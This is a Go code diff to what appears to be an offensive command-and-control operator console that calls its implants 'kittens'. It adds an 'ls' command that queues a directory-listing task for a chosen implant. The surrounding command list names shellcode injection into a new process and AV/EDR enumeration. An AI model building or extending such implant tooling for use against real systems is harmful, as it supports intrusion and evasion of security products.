@@ -33,6 +33,7 @@ func completerInteract(d prompt.Document) []prompt.Suggest {
 		{Text: "shellcode", Description: "Inject shellcode in new process"},
 		{Text: "sleep", Description: "Set sleep time"},
 		{Text: "ps", Description: "Get process list"},
+		{Text: "ls", Description: "List out the files of a directory"},
 		{Text: "av", Description: "Get AV/EDR with wmi"},
 		{Text: "priv", Description: "Get privileges and integrity level"},
 		{Text: "info", Description: "Show the kitten info"},
@@ -200,6 +201,24 @@ func interact(kittenName string) error {
 				break
 			}
 			go checkForResponse(kittenName)
+		case "ls":
+			fmt.Printf("%s\n", "Please enter the directory you want to enumerate")
+			path, err := i.Read("Path: ")
+			if err != nil {
+				return err
+			}
+			if path == "" {
+				fmt.Println("[!] Please enter a path")
+				break
+			}
+			t := task.Task{
+				Tag:     "ls",
+				Payload: []byte(path),
+			}
+			err = CreateTask(&t, kittenName)
+			if err != nil {
+				return err
+			}
 		case "priv":
 			t := task.Task{
 				Tag:     "priv",
